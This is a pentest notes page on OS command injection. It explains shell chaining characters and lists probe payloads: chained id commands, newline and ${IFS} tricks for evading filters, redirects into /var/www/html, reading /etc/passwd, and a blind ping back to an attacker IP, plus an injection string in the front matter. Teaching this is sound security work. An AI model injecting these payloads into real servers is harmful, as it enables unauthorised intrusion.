---
description: ;ping+-c+10.10.10.10+1#
---

# Command Injection

Command Injection is a critical vulnerability that results in attackers being able to directly manipulate and control a server remotely. This exploit abuses the lack of input validation in a server through some special characters inputted by attackers.

<figure><img src="../.gitbook/assets/image (807).png" alt=""><figcaption><p><em>Taken from PortSwigger Web Security Academy</em></p></figcaption></figure>

## Exploitation

In order to exploit this properly, we need to understand some special characters and what they do within an application.

{% code overflow="wrap" %}
```bash
# --> comment
$() --> expression in bash that evaluates the text inside bracket as commands
; --> used to chain commands together e.g. id ; whoami would execute 2 commands at once
| --> pipe used to pass output from one command to another e.g. whoami | echo
& --> Bitwise AND Operator
&& --> Logical AND Operator
|| --> Logical OR Operator
%0a --> URI encoded \n character, meaning enter is pressed on keyboard
> --> redirect output somewhere
< --> send file content as an input
' --> escape quotes where necessary
${IFS} --> means " " or space character, useful when there is strict WAF checking
```
{% endcode %}

Here are some possible payloads for testing whether Command Injection Works:

{% code overflow="wrap" %}
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2nd
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not execute but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
{% endcode %}

Generally, if we can view the output of our command, it's very easy to see if we have Command Injection.

<figure><img src="../.gitbook/assets/image (3767).png" alt=""><figcaption><p><em>Look at Cmd parameter</em></p></figcaption></figure>

### Blind Injection

Sometimes, we cannot view the output of whatever command we injected. As such, we need to use other commands to 'force' an output.

What I like to use is a `ping` command. When we ping something, what we are really doing is sending something called an **Internet Control Message Protocol (ICMP) packet** to another host. If the host replies with another ICMP packet, then the ping works and the host is alive.

We can test out our Command Injection using this command.

```bash
ping -c 1 10.10.10.10
# if URL encoding needed
ping+-c+1+10.10.10.10
```

What this does is make the machine send **1** ping packet to another host. We can set up a listener on our attacking machine using `tcpdump` on the network interface we expect to receive the packet on and to only respond if ICMP packets are received.

Below is an example of a succesful exploit script being used to execute the `ping` command. We can see the received PING packet from the second terminal window.

<figure><img src="../.gitbook/assets/image (1580).png" alt=""><figcaption></figcaption></figure>
